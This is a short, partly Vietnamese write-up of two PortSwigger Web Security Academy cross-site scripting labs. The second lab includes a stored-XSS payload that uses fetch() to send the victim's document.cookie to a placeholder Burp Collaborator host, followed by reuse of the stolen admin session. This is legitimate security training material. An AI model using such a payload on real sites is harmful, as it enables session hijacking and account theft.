# [Portswigger] Cross-site scripting
***

## 1. Lab: Reflected XSS into HTML context with nothing encoded
* Content:
```
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function.
```
* Exploit:

<img width="379" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40b02cef-ed0e-4437-a80a-534d4b0a8ab2">

<img width="227" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7304d580-c21d-4aaa-b367-1a49c6b8abd6">

***

## 2. Lab: Exploiting cross-site scripting to steal cookies

* Content:
```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.
```
* Exploit:

Post comment như sau:

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1a29c93e-410b-4981-ad59-ceaddca4a6b8">

Burp Collaborator đã log lại được comment body chứa cookie:

<img width="451" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4a98f157-1034-46f7-8ba3-6d2adf4de7e4">

Dùng cookie này truy cập được vào phiên của admin. Lab Solved!

***
